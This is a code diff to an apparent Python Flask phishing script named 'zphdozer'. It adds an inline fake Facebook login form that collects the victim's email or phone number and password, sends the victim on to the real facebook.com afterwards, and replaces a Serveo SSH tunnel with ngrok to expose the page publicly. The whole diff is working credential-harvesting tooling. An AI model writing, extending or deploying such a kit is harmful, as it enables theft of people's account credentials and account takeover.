@@ -1,9 +1,12 @@
 import os
 import uuid
+import hashlib
 import sys
-from flask import Flask, request, send_from_directory, redirect
+from flask import Flask, request, redirect
 import threading
 import subprocess
+import time
+import json
 
 # Configuración de Flask
 app = Flask(__name__)
@@ -12,10 +15,30 @@ app = Flask(__name__)
 def generate_unique_id():
     return str(uuid.uuid4())
 
-# Ruta para servir el archivo HTML de la carpeta "webs/Facebook"
+# Ruta para la página principal
 @app.route('/')
 def index():
-    return send_from_directory('webs/Facebook', 'index.html')
+    return '''
+    <h1>Bienvenido a zphdozer</h1>
+    <p>Marca 1 para elegir la primera opción</p>
+    <p><a href="/facebook_login">1: Facebook login</a></p>
+    '''
+
+# Ruta para el formulario de inicio de sesión
+@app.route('/facebook_login')
+def facebook_login():
+    return '''
+    <h1>Facebook Login</h1>
+    <form action="/submit_form" method="post">
+        <div>
+            <input type="text" id="email" name="email" placeholder="Celular o correo electrónico">
+        </div>
+        <div>
+            <input type="password" id="password" name="password" placeholder="Contraseña">
+        </div>
+        <button type="submit">Iniciar sesión</button>
+    </form>
+    '''
 
 # Ruta para manejar el envío del formulario
 @app.route('/submit_form', methods=['POST'])
@@ -47,17 +70,26 @@ def submit_form():
     # Redirigir al usuario a Facebook
     return redirect('https://www.facebook.com')
 
+# Configuración para servir archivos estáticos (CSS)
+@app.route('/static/<path:filename>')
+def static_files(filename):
+    return app.send_static_file(filename)
+
 def run_server():
     app.run(host='0.0.0.0', port=5001)
 
-def start_serveo():
-    # Conectar a Serveo y redirigir el puerto 5001
-    process = subprocess.Popen(['ssh', '-R', '80:localhost:5001', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+def start_ngrok():
+    # Iniciar ngrok en un subproceso
+    process = subprocess.Popen(['ngrok', 'http', '5001'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(2)  # Esperar un momento para que ngrok se inicie
+
+    # Obtener la URL pública de ngrok
     url = ''
     for line in process.stdout:
         if b'http' in line:
             url = line.decode().strip()
             break
+
     return url
 
 def main():
@@ -87,11 +119,11 @@ def main():
             server_thread.daemon = True
             server_thread.start()
             print("Servidor en ejecución en http://localhost:5001")
-            url_serveo = start_serveo()
-            if url_serveo:
-                print(f"Tu servidor está disponible en: {url_serveo}")
+            url_ngrok = start_ngrok()
+            if url_ngrok:
+                print(f"Tu servidor está disponible en: {url_ngrok}")
             else:
-                print("No se pudo obtener la URL de Serveo.")
+                print("No se pudo obtener la URL de ngrok.")
             input("Presiona Enter para salir...")
         elif opcion == '2':
             print("Saliendo...")
